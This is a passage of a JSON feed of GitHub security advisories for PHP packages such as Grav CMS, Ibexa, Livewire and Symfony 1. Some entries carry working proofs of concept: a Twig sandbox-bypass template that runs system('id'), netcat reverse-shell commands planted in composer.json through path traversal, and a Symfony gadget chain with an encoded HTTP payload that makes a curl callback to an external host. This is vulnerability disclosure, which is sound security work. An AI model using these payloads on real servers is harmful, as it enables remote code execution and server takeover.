configuration: `system.twig.safe_filters`\", E_USER_DEPRECATED);\n                return new TwigFilter($name, $name);\n            }\n...\n</code></pre>\n<p>In the code above it can be seen that the calls of the \"isDangerousFunction()\" are not performed when the method/filter in the \"$name\" variable has been considered safe. A function can be defined safe only by an administrator user, by adding it into the configuration properties \"system.twig.safe_functions\" and/or \"system.twig.safe_filters\" (a sort of whitelists that by default are empty) of the configuration file \"system/config/system.yaml\".</p>\n<p>It is to note that within the \"system/src/Grav/Common/Twig.php\" file a Twig class is defined (with its constructor, methods and attributes) and in particular the Twig object (and environment) is instantiated on it:</p>\n<pre><code class=\"language-php\">/**\n * Class Twig\n * @package Grav\\Common\\Twig\n */\nclass Twig\n{\n    /** @var Environment */\n    public $twig;\n    /** @var array */\n    public $twig_vars = [];\n    /** @var array */\n    public $twig_paths;\n    /** @var string */\n    public $template;\n...\n   /**\n     * Constructor\n     *\n     * @param Grav $grav\n     */\n    public function __construct(Grav $grav)\n    {\n        $this-&gt;grav = $grav;\n        $this-&gt;twig_paths = [];\n    }\n\n    /**\n     * Twig initialization that sets the twig loader chain, then the environment, then extensions\n     * and also the base set of twig vars\n     *\n     * @return $this\n     */\n    public function init()\n    {\n        if (null === $this-&gt;twig) {\n            /** @var Config $config */\n            $config = $this-&gt;grav['config'];\n...\n</code></pre>\n<p>Since the security sandbox does not protect the Twig object it is possible to interact with it (e.g. call its methods, read/write its attributes) through opportunely crafted Twig template directives injected on a web page. \nThen an authenticated editor user could be able to add arbitrary functions into the Twig attributes \"system.twig.safe_functions\" and \"system.twig.safe_filters\" in order to circumvent the Grav CMS sandbox.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>An authenticated user with the permissions to edit a page (having Twig processing enabled) on the Grav CMS admin console, could create/edit a web page containing a malicious template directive to execute arbitrary OS commands on the remote web server.\nFor instance, in order to abuse the vulnerability and execute the prohibited \"system('id')\" code, bypassing the sandbox, the editor could generate a web page containing the following template directives:</p>\n<pre><code>{% set arr = {'1':'system', '2':'foo'} %}\n{{ var_dump(grav.twig.twig_vars['config'].set('system.twig.safe_functions', arr)) }}\n{{ system('id') }}\n</code></pre>\n<p>Once saved the malicious page could be accessed by unauthenticated users to execute the \"system('id')\" code on the remote server hosting the vulnerable Grav CMS.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>It is possible to execute remote code on the underlying server and compromise it.</p>\n<h3 id=\"tested-version\">Tested version</h3>\n<p>Grav CMS v1.7.43</p>\n<h3 id=\"reported-by\">Reported by</h3>\n<p>Maurizio Siddu</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/getgrav/grav/security/advisories/GHSA-c9gp-64c4-2rrh\">https://github.com/getgrav/grav/security/advisories/GHSA-c9gp-64c4-2rrh</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-28116\">https://nvd.nist.gov/vuln/detail/CVE-2024-28116</a></li>\n<li><a href=\"https://github.com/getgrav/grav/commit/4149c81339274130742831422de2685f298f3a6e\">https://github.com/getgrav/grav/commit/4149c81339274130742831422de2685f298f3a6e</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c9gp-64c4-2rrh\">https://github.com/advisories/GHSA-c9gp-64c4-2rrh</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c9gp-64c4-2rrh",
            "title": "[getgrav/grav] Server-Side Template Injection (SSTI) with Grav CMS security sandbox bypass",
            "date_modified": "2024-03-22T16:30:29.000Z",
            "date_published": "2024-03-22T16:30:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c9gp-64c4-2rrh"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p><em>A file upload path traversal vulnerability has been identified in the application, enabling attackers to replace or create files with extensions like .json, .zip, .css, .gif, etc. This security flaw poses severe risks, that can allow attackers to inject arbitrary code on the server, undermine integrity of backup files by overwriting existing files or creating new ones, and exfiltrate sensitive data using CSS exfiltration techniques.</em></p>\n<h3 id=\"installation-configuration\">Installation Configuration</h3>\n<ul>\n<li>Grav CMS 1.10.44</li>\n<li>Apache web server</li>\n<li>php-8.2</li>\n</ul>\n<h3 id=\"details\">Details</h3>\n<p><em><strong>Vulnerable code location:</strong></em> grav/system/src/Grav/Common/Media/Traits/MediaUploadTrait.php/checkFileMetadata() method_</p>\n<pre><code>public function checkFileMetadata(array $metadata, string $filename = null, array $settings = null): string\n{\n    // Add the defaults to the settings.\n    $settings = $this-&gt;getUploadSettings($settings);\n\n    // Destination is always needed (but it can be set in defaults).\n    $self = $settings['self'] ?? false;\n    if (!isset($settings['destination']) &amp;&amp; $self === false) {\n        throw new RuntimeException($this-&gt;translate('PLUGIN_ADMIN.DESTINATION_NOT_SPECIFIED'), 400);\n    }\n\n    if (null === $filename) {\n        // If no filename is given, use the filename from the uploaded file (path is not allowed). \n        $folder = '';\n        $filename = $metadata['filename'] ?? '';\n    } else {\n        // If caller sets the filename, we will accept any custom path.\n        $folder = dirname($filename);\n        if ($folder === '.') {\n            $folder = '';\n        }\n        $filename = Utils::basename($filename);\n</code></pre>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>Log in to the Grav CMS using a super administrator account.</li>\n<li>Add a user in the \"Accounts\" section with the following permissions:</li>\n</ol>\n<ul>\n<li>Login to Admin</li>\n<li>Page Update</li>\n</ul>\n<ol start=\"3\">\n<li>Log out of the super administrator account and log in with the previously created user account.</li>\n<li>Navigate to the https://admin/pages/home.</li>\n<li>Use the following command in Kali Linux to open a netcat listener:</li>\n</ol>\n<pre><code>nc -lvnp 8081\n</code></pre>\n<p><img alt=\"image\" src=\"https://user-images.githubusercontent.com/48800246/296318900-cc257c4f-e67e-45af-a2a1-1ee5d7e6d165.png\">\nNote: \"nc\" or netcat (often abbreviated to nc) is a computer networking utility for reading from and writing to network connections using TCP or UDP. We are using this tool to get a reverse shell from the server hosting Grav CMS.\n7. Using a web interception proxy, click on the \"Page Media\" section and upload a json file with the following added to the \"scripts\" section (<a href=\"https://getcomposer.org/doc/articles/scripts.md\">https://getcomposer.org/doc/articles/scripts.md</a>):</p>\n<pre><code>\"post-install-cmd\": \"nc &lt;IP-address&gt; 8081 -e /bin/bash\",\n\"post-update-cmd\": \"nc &lt;IP-address&gt; 8081 -e /bin/bash\"\n</code></pre>\n<p><strong><em>Note:</em></strong> The post installation and update script used in this PoC is only for demonstration purposes. There are various other scripts that may be injected such as <code>command</code> that executes the corresponding script before any Composer Command is executed on the CLI.\n<img alt=\"image\" src=\"https://user-images.githubusercontent.com/48800246/296317602-89fe155d-34a7-4b35-a6b4-d1964057ce65.png\">\n<em>Note: . Please replace  with the IP address of the Kali Linux netcat listener.</em>\n8. Modify the \"name\" parameter to \"../../../c/omposer.json\" and forward the request.\n9. Observe the successful upload message from the server response:\n<img alt=\"image\" src=\"https://user-images.githubusercontent.com/48800246/296320057-fcc0d456-c282-42eb-bcf0-1155d4b5d24a.png\">\n10. In the Grav web root, observe that the \"composer.json\" file was successfully replaced by the malicious \"composer.json\" file containing a reverse shell script.\n11. Run any variations of the following commands in the Grav web server and observe the successful reverse shell:</p>\n<ul>\n<li>bin/grav composer</li>\n<li>composer update</li>\n<li>composer install\n<img alt=\"image\" src=\"https://user-images.githubusercontent.com/48800246/296322101-5654dee4-44ba-4806-9dc7-25d8e0240486.png\"></li>\n</ul>\n<h3 id=\"impact\">Impact</h3>\n<ol>\n<li><p><strong>Arbitrary Code Injection:</strong> Attackers can replace a malicious composer.json file, executed during \"composer\" package updates/installations or \"bin/gpm composer\" commands. This can allow unauthorized code execution on the server, with the added severity of reverse shell access, granting attackers control over the web server.</p>\n</li>\n<li><p><strong>Backup Compromise:</strong> .zip backup files can be replaced, potentially undermining data integrity and recovery mechanisms:\n<img alt=\"image\" src=\"https://github.com/getgrav/grav/assets/48800246/94ab1546-a576-43a7-ac6e-f72acee74fb8\">\n<img alt=\"image\" src=\"https://github.com/getgrav/grav/assets/48800246/7f29b597-ca17-4e17-a949-c8658e567caa\"></p>\n</li>\n<li><p><strong>Sensitive Information Exposure:</strong> Modification of .css files provides an avenue for attackers to exfiltrate sensitive information, such as usernames and passwords, compromising user confidentiality.\n<img alt=\"image\" src=\"https://github.com/getgrav/grav/assets/48800246/ed492d7b-0776-4a56-8b8f-fde7b8c9ea99\"></p>\n</li>\n</ol>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/getgrav/grav/security/advisories/GHSA-m7hx-hw6h-mqmc\">https://github.com/getgrav/grav/security/advisories/GHSA-m7hx-hw6h-mqmc</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-27921\">https://nvd.nist.gov/vuln/detail/CVE-2024-27921</a></li>\n<li><a href=\"https://github.com/getgrav/grav/commit/5928411b86bab05afca2b33db4e7386a44858e99\">https://github.com/getgrav/grav/commit/5928411b86bab05afca2b33db4e7386a44858e99</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-m7hx-hw6h-mqmc\">https://github.com/advisories/GHSA-m7hx-hw6h-mqmc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-m7hx-hw6h-mqmc",
            "title": "[getgrav/grav] File Upload Path Traversal",
            "date_modified": "2024-03-22T16:29:58.000Z",
            "date_published": "2024-03-22T16:29:57.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-m7hx-hw6h-mqmc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>File validation can be configured to reject certain files by file type. When this happens, validation fails, and the content can't be published. However, the file can be saved when saving the content draft. This means unwanted files can be present in storage, even if they are not easily accessible due to the content not being published. The fix ensures these unwanted file types are never stored. An attacker would need to have existing access to create content with a file field type to exploit this.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>See \"Patched versions\".\nCommit: <a href=\"https://github.com/ibexa/core/commit/7e472317f7c75f45f72f74c38406952d8bea0de1\">https://github.com/ibexa/core/commit/7e472317f7c75f45f72f74c38406952d8bea0de1</a></p>\n<h3 id=\"references\">References</h3>\n<p><a href=\"https://developers.ibexa.co/security-advisories/ibexa-sa-2024-002-file-validation-and-workflow-stages\">https://developers.ibexa.co/security-advisories/ibexa-sa-2024-002-file-validation-and-workflow-stages</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ibexa/core/security/advisories/GHSA-9j39-4686-m3c4\">https://github.com/ibexa/core/security/advisories/GHSA-9j39-4686-m3c4</a></li>\n<li><a href=\"https://github.com/ibexa/core/commit/7e472317f7c75f45f72f74c38406952d8bea0de1\">https://github.com/ibexa/core/commit/7e472317f7c75f45f72f74c38406952d8bea0de1</a></li>\n<li><a href=\"https://developers.ibexa.co/security-advisories/ibexa-sa-2024-002-file-validation-and-workflow-stages\">https://developers.ibexa.co/security-advisories/ibexa-sa-2024-002-file-validation-and-workflow-stages</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9j39-4686-m3c4\">https://github.com/advisories/GHSA-9j39-4686-m3c4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9j39-4686-m3c4",
            "title": "[ibexa/core] Ibexa Kernel's files with blacklisted extensions can be still saved to drafts",
            "date_modified": "2024-03-20T18:56:41.000Z",
            "date_published": "2024-03-20T18:14:41.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9j39-4686-m3c4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>File validation can be configured to reject certain files by file type. When this happens, validation fails, and the content can't be published. However, the file can be saved when saving the content draft. This means unwanted files can be present in storage, even if they are not easily accessible due to the content not being published. The fix ensures these unwanted file types are never stored. An attacker would need to have existing access to create content with a file field type to exploit this.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>See \"Patched versions\".\nCommit: <a href=\"https://github.com/ibexa/core/commit/7e472317f7c75f45f72f74c38406952d8bea0de1\">https://github.com/ibexa/core/commit/7e472317f7c75f45f72f74c38406952d8bea0de1</a></p>\n<h3 id=\"references\">References</h3>\n<p><a href=\"https://developers.ibexa.co/security-advisories/ibexa-sa-2024-002-file-validation-and-workflow-stages\">https://developers.ibexa.co/security-advisories/ibexa-sa-2024-002-file-validation-and-workflow-stages</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ibexa/core/security/advisories/GHSA-9j39-4686-m3c4\">https://github.com/ibexa/core/security/advisories/GHSA-9j39-4686-m3c4</a></li>\n<li><a href=\"https://github.com/ibexa/core/commit/7e472317f7c75f45f72f74c38406952d8bea0de1\">https://github.com/ibexa/core/commit/7e472317f7c75f45f72f74c38406952d8bea0de1</a></li>\n<li><a href=\"https://developers.ibexa.co/security-advisories/ibexa-sa-2024-002-file-validation-and-workflow-stages\">https://developers.ibexa.co/security-advisories/ibexa-sa-2024-002-file-validation-and-workflow-stages</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9j39-4686-m3c4\">https://github.com/advisories/GHSA-9j39-4686-m3c4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9j39-4686-m3c4",
            "title": "[ibexa/core] Ibexa Kernel's files with blacklisted extensions can be still saved to drafts",
            "date_modified": "2024-03-20T18:56:41.000Z",
            "date_published": "2024-03-20T18:14:41.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9j39-4686-m3c4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>File validation can be configured to reject certain files by file type. When this happens, validation fails, and the content can't be published. However, the file can be saved when saving the content draft. This means unwanted files can be present in storage, even if they are not easily accessible due to the content not being published. The fix ensures these unwanted file types are never stored. An attacker would need to have existing access to create content with a file field type to exploit this.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>See \"Patched versions\".\nCommit: <a href=\"https://github.com/ezsystems/ezplatform-kernel/commit/7e472317f7c75f45f72f74c38406952d8bea0de1\">https://github.com/ezsystems/ezplatform-kernel/commit/7e472317f7c75f45f72f74c38406952d8bea0de1</a></p>\n<h3 id=\"references\">References</h3>\n<p><a href=\"https://developers.ibexa.co/security-advisories/ibexa-sa-2024-002-file-validation-and-workflow-stages\">https://developers.ibexa.co/security-advisories/ibexa-sa-2024-002-file-validation-and-workflow-stages</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ezsystems/ezplatform-kernel/security/advisories/GHSA-mwvh-p3hx-x4gg\">https://github.com/ezsystems/ezplatform-kernel/security/advisories/GHSA-mwvh-p3hx-x4gg</a></li>\n<li><a href=\"https://github.com/ezsystems/ezplatform-kernel/commit/7e472317f7c75f45f72f74c38406952d8bea0de1\">https://github.com/ezsystems/ezplatform-kernel/commit/7e472317f7c75f45f72f74c38406952d8bea0de1</a></li>\n<li><a href=\"https://developers.ibexa.co/security-advisories/ibexa-sa-2024-002-file-validation-and-workflow-stages\">https://developers.ibexa.co/security-advisories/ibexa-sa-2024-002-file-validation-and-workflow-stages</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mwvh-p3hx-x4gg\">https://github.com/advisories/GHSA-mwvh-p3hx-x4gg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mwvh-p3hx-x4gg",
            "title": "[ezsystems/ezplatform-kernel] Ibexa Kernel's files with blacklisted extensions can be still saved to drafts",
            "date_modified": "2024-03-20T18:55:45.000Z",
            "date_published": "2024-03-20T18:13:09.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mwvh-p3hx-x4gg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Versions of the package livewire/livewire from 3.3.5 and before 3.4.9 are vulnerable to Cross-site Scripting (XSS) when a page uses [Url] for a property. An attacker can inject HTML code in the context of the user's browser session by crafting a malicious link and convincing the user to click on it.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-21504\">https://nvd.nist.gov/vuln/detail/CVE-2024-21504</a></li>\n<li><a href=\"https://github.com/livewire/livewire/pull/8117\">https://github.com/livewire/livewire/pull/8117</a></li>\n<li><a href=\"https://github.com/livewire/livewire/commit/c65b3f0798ab2c9338213ede3588c3cdf4e6fcc0\">https://github.com/livewire/livewire/commit/c65b3f0798ab2c9338213ede3588c3cdf4e6fcc0</a></li>\n<li><a href=\"https://github.com/livewire/livewire/releases/tag/v3.4.9\">https://github.com/livewire/livewire/releases/tag/v3.4.9</a></li>\n<li><a href=\"https://security.snyk.io/vuln/SNYK-PHP-LIVEWIRELIVEWIRE-6446222\">https://security.snyk.io/vuln/SNYK-PHP-LIVEWIRELIVEWIRE-6446222</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-389c-cf87-qmwj\">https://github.com/advisories/GHSA-389c-cf87-qmwj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-389c-cf87-qmwj",
            "title": "[livewire/livewire] Cross-site Scripting in livewire/livewire",
            "date_modified": "2024-03-20T15:25:07.000Z",
            "date_published": "2024-03-19T06:30:53.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-389c-cf87-qmwj"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Vulnerability in <strong>SecureProps</strong> involves a regex failing to detect tags during decryption of encrypted data. </p>\n<p>This occurs when the encrypted data has been encoded with <code>NullEncoder</code> and passed to <code>TagAwareCipher</code>, and contains special characters such as <code>\\n</code>. As a result, the decryption process is skipped since the tags are not detected. This causes the encrypted data to be returned in plain format. </p>\n<p>The vulnerability affects users who implement <code>TagAwareCipher</code> with any base cipher that has <code>NullEncoder</code> (not default).</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The patch for the issue has been released. Users are advised to update to version <strong>1.2.2</strong>.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p><strong>The main recommendation is to update to the latest version as there are no breaking changes.</strong></p>\n<p>If that's not possible, you can use the default <code>Base64Encoder</code> with the base cipher decorated with <code>TagAwareCipher</code> to prevent special characters in the encrypted string from interfering with regex tag detection logic. </p>\n<p>This workaround is safe but may involve double encoding since <code>TagAwareCipher</code> uses <code>Base64Encoder</code> by default.</p>\n<h3 id=\"references\">References</h3>\n<p>Reported issue: <a href=\"https://github.com/IlicMiljan/Secure-Props/issues/20\">https://github.com/IlicMiljan/Secure-Props/issues/20</a>\nPull request resolving bug: <a href=\"https://github.com/IlicMiljan/Secure-Props/pull/21\">https://github.com/IlicMiljan/Secure-Props/pull/21</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/IlicMiljan/Secure-Props/security/advisories/GHSA-rj29-j2g4-77q8\">https://github.com/IlicMiljan/Secure-Props/security/advisories/GHSA-rj29-j2g4-77q8</a></li>\n<li><a href=\"https://github.com/IlicMiljan/Secure-Props/issues/20\">https://github.com/IlicMiljan/Secure-Props/issues/20</a></li>\n<li><a href=\"https://github.com/IlicMiljan/Secure-Props/pull/21\">https://github.com/IlicMiljan/Secure-Props/pull/21</a></li>\n<li><a href=\"https://github.com/IlicMiljan/Secure-Props/commit/ab7b561040cd37fda3dbf9a6cab01fefcaa16627\">https://github.com/IlicMiljan/Secure-Props/commit/ab7b561040cd37fda3dbf9a6cab01fefcaa16627</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-28864\">https://nvd.nist.gov/vuln/detail/CVE-2024-28864</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rj29-j2g4-77q8\">https://github.com/advisories/GHSA-rj29-j2g4-77q8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rj29-j2g4-77q8",
            "title": "[ilicmiljan/secure-props] [TagAwareCipher] - Decryption Failure (Regex Match)",
            "date_modified": "2024-03-19T18:30:48.000Z",
            "date_published": "2024-03-18T20:39:00.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rj29-j2g4-77q8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Symfony 1 has a gadget chain due to vulnerable Swift Mailer dependency that would enable an attacker to get remote code execution if a developer unserialize user input in his project.</p>\n<h3 id=\"details\">Details</h3>\n<p>This vulnerability present no direct threat but is a vector that will enable remote code execution if a developper deserialize user untrusted data. For example:</p>\n<pre><code class=\"language-php\"> public function executeIndex(sfWebRequest $request)\n  {\n    $a = unserialize($request-&gt;getParameter('user'));\n  }\n</code></pre>\n<p>We will make the assumption this is the case in the rest of this explanation.</p>\n<p>Symfony 1 depends on Swift Mailer which is bundled by default in <code>vendor</code> directory in the default installation since 1.3.0. Swift Mailer classes implement some <code>__destruct()</code> methods like for instance <code>Swift_KeyCache_DiskKeyCache</code> :</p>\n<pre><code class=\"language-php\">  public function __destruct()\n  {\n    foreach ($this-&gt;_keys as $nsKey=&gt;$null)\n    {\n      $this-&gt;clearAll($nsKey);\n    }\n  }\n</code></pre>\n<p>This method is called when php destroy the object in memory. However, it is possible to include any object type in <code>$this-&gt;_keys</code> to make PHP access to another array/object properties than intended by the developer. In particular, it is possible to abuse the array access which is triggered on <code>foreach($this-&gt;_keys ...)</code> for any class implementing <code>ArrayAccess</code>  interface. <code>sfOutputEscaperArrayDecorator</code>  implements such interface. Here is the call made on <code>offsetGet()</code>:</p>\n<pre><code class=\"language-php\">  public function offsetGet($offset)\n  {\n    return sfOutputEscaper::escape($this-&gt;escapingMethod, $this-&gt;value[$offset]);\n  }\n</code></pre>\n<p>Which trigger <code>escape()</code> in <code>sfOutputEscaper</code> class with attacker controlled parameters from deserialized object with <code>$this-&gt;escapingMethod</code> and <code>$this-&gt;value[$offset]</code>:</p>\n<pre><code class=\"language-php\">  public static function escape($escapingMethod, $value)\n  {\n    if (null === $value)\n    {\n      return $value;\n    }\n\n    // Scalars are anything other than arrays, objects and resources.\n    if (is_scalar($value))\n    {\n      return call_user_func($escapingMethod, $value);\n    }\n</code></pre>\n<p>Which calls <code>call_user_func</code> with previous attacker controlled input.</p>\n<p>However, most recent versions of Swift Mailer are not vulnerable anymore. A fix has been done with <a href=\"https://github.com/swiftmailer/swiftmailer/commit/5878b18b36c2c119ef0e8cd49c3d73ee94ca0fed\">commit 5878b18b36c2c119ef0e8cd49c3d73ee94ca0fed</a> to prevent #arbitrary deserialization. This commit has been shipped with version 6.2.5 of Swift Mailer.</p>\n<p>Concreetly, <code>__wakeup()</code> have been implemented to clear attributes' values:</p>\n<pre><code class=\"language-php\">  public function __wakeup()\n  {\n      $this-&gt;keys = [];\n  }\n</code></pre>\n<p>And/or prevent any deserialization:</p>\n<pre><code class=\"language-php\">  public function __wakeup()\n  {\n      throw new \\BadMethodCallException('Cannot unserialize '.__CLASS__);\n  }\n</code></pre>\n<p>If you install last version 1.5 with composer, you will end-up installing last 6.x version of Swift Mailer containing the previous fixes. Here is an extract of the composer.lock:</p>\n<pre><code class=\"language-json\">{\n  \"name\": \"friendsofsymfony1/symfony1\",\n  \"version\": \"v1.5.15\",\n  \"source\": {\n      \"type\": \"git\",\n      \"url\": \"https://github.com/FriendsOfSymfony1/symfony1.git\",\n      \"reference\": \"9945f3f27cdc5aac36f5e8c60485e5c9d5df86f2\"\n  },\n  \"require\": {\n      \"php\": \"&gt;=5.3.0\",\n      \"swiftmailer/swiftmailer\": \"~5.2 || ^6.0\"\n  },\n  ...\n  {\n    \"name\": \"swiftmailer/swiftmailer\",\n    \"version\": \"v6.3.0\",\n  ...\n  }\n}\n</code></pre>\n<p>By reviewing releases archives, <code>composer.json</code> targets vulnerable branch 5.x before Symfony 1.5.13 included:</p>\n<pre><code class=\"language-json\">{\n    \"name\": \"friendsofsymfony1/symfony1\",\n    \"description\": \"Fork of symfony 1.4 with dic, form enhancements, latest swiftmailer and better performance\",\n    \"type\": \"library\",\n    \"license\": \"MIT\",\n    \"require\": {\n        \"php\" : \"&gt;=5.3.0\",\n        \"swiftmailer/swiftmailer\": \"~5.2\"\n    },\n    ...\n</code></pre>\n<p>So, the gadget chain is valid for at least versions until 1.5.13.</p>\n<p>However, if you install last version of Symfony with git as described in the README, Swift Mailer vendors is referenced through a git sub-module targeting branch 5.x of Swift Mailer:</p>\n<pre><code class=\"language-shell\">[submodule \"lib/vendor/swiftmailer\"]\n    path = lib/vendor/swiftmailer\n    url = https://github.com/swiftmailer/swiftmailer.git\n    branch = 5.x\n[submodule \"lib/plugins/sfDoctrinePlugin/lib/vendor/doctrine\"]\n    path = lib/plugins/sfDoctrinePlugin/lib/vendor/doctrine\n    url = https://github.com/FriendsOfSymfony1/doctrine1.git\n</code></pre>\n<p>And branch 5.x does not have the backport of the fix commited on branch 6.x. Last commit date from Jul 31, 2018.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>So we need the following object to trigger an OS command like <code>shell_exec(\"curl https://h0iphk4mv3e55nt61wjp9kur9if930vok.oastify.com?a=$(id)\");</code>:</p>\n<pre><code class=\"language-php\">object(Swift_KeyCache_DiskKeyCache)#88 (4) {\n  [\"_stream\":\"Swift_KeyCache_DiskKeyCache\":private]=&gt;\n  NULL\n  [\"_path\":\"Swift_KeyCache_DiskKeyCache\":private]=&gt;\n  string(25) \"thispathshouldneverexists\"\n  [\"_keys\":\"Swift_KeyCache_DiskKeyCache\":private]=&gt;\n  object(sfOutputEscaperArrayDecorator)#89 (3) {\n    [\"count\":\"sfOutputEscaperArrayDecorator\":private]=&gt;\n    NULL\n    [\"value\":protected]=&gt;\n    array(1) {\n      [1]=&gt;\n      string(66) \"curl https://h0iphk4mv3e55nt61wjp9kur9if930vok.oastify.com?a=$(id)\"\n    }\n    [\"escapingMethod\":protected]=&gt;\n    string(10) \"shell_exec\"\n  }\n  [\"_quotes\":\"Swift_KeyCache_DiskKeyCache\":private]=&gt;\n  bool(false)\n}\n</code></pre>\n<p>We craft a chain with PHPGGC. Please do not publish it as I will make a PR on PHPGGC but I wait for you to fix before:</p>\n<ul>\n<li>gadgets.php:</li>\n</ul>\n<pre><code class=\"language-php\">class Swift_KeyCache_DiskKeyCache\n{\n  private $_path;\n  private $_keys = array();\n  public function __construct($keys, $path) {\n    $this-&gt;_keys = $keys;\n    $this-&gt;_path = $path;\n  }\n}\n\nclass sfOutputEscaperArrayDecorator\n{\n  protected $value;\n  protected $escapingMethod;\n  public function __construct($escapingMethod, $value) {\n    $this-&gt;escapingMethod = $escapingMethod;\n    $this-&gt;value = $value;\n  }\n}\n</code></pre>\n<ul>\n<li>chain.php:</li>\n</ul>\n<pre><code class=\"language-php\">namespace GadgetChain\\Symfony;\n\nclass RCE12 extends \\PHPGGC\\GadgetChain\\RCE\\FunctionCall\n{\n    public static $version = '1.3.0 &lt; 1.5.15';\n    public static $vector = '__destruct';\n    public static $author = 'darkpills';\n    public static $information = \n        'Based on Symfony 1 and Swift mailer in Symfony\\'s vendor';\n\n    public function generate(array $parameters)\n    {\n        $cacheKey = \"1\";\n        $keys = new \\sfOutputEscaperArrayDecorator($parameters['function'], array($cacheKey =&gt; $parameters['parameter']));\n        $path = \"thispathshouldneverexists\";\n        $cache = new \\Swift_KeyCache_DiskKeyCache($keys, $path);\n\n        return $cache;\n    }\n}\n</code></pre>\n<p>And trigger the deserialization with an HTTP request like the following on a dummy test controller:</p>\n<pre><code class=\"language-http\">POST /frontend_dev.php/test/index HTTP/1.1\nHost: localhost:8001\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 532\n\nuser=a%3A2%3A%7Bi%3A7%3BO%3A27%3A%22Swift_KeyCache_DiskKeyCache%22%3A2%3A%7Bs%3A34%3A%22%00Swift_KeyCache_DiskKeyCache%00_path%22%3Bs%3A25%3A%22thispathshouldneverexists%22%3Bs%3A34%3A%22%00Swift_KeyCache_DiskKeyCache%00_keys%22%3BO%3A29%3A%22sfOutputEscaperArrayDecorator%22%3A2%3A%7Bs%3A8%3A%22%00%2A%00value%22%3Ba%3A1%3A%7Bi%3A1%3Bs%3A66%3A%22curl+https%3A%2F%2Fh0iphk4mv3e55nt61wjp9kur9if930vok.oastify.com%3Fa%3D%24%28id%29%22%3B%7Ds%3A17%3A%22%00%2A%00escapingMethod%22%3Bs%3A10%3A%22shell_exec%22%3B%7D%7Di%3A7%3Bi%3A7%3B%7D\n</code></pre>\n<p>Note that CVSS score is not applicable to this kind of vulnerability.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>The attacker can execute any PHP command which leads to remote code execution.</p>\n<h3 id=\"recommendation\">Recommendation</h3>\n<p>As with composer, Symfony is already using branch 6.x of Swift mailer there does not seem to be breaking change for Symfony 1 with branch 6.x? Or is it a mistake?</p>\n<p>In this case, update submodule reference to version 6.2.5 or higher, after commit 5878b18b36c2c119ef0e8cd49c3d73ee94ca0fed</p>\n<p>Or if Symfony 1.5 need Swift 5.x, fork Swift mailer in a FOS/SwiftMailer repository and cherry-pick commit 5878b18b36c2c119ef0e8cd49c3d73ee94ca0fed</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/FriendsOfSymfony1/symfony1/security/advisories/GHSA-wjv8-pxr6-5f4r\">https://github.com/FriendsOfSymfony1/symfony1/security/advisories/GHSA-wjv8-pxr6-5f4r</a></li>\n<li><a 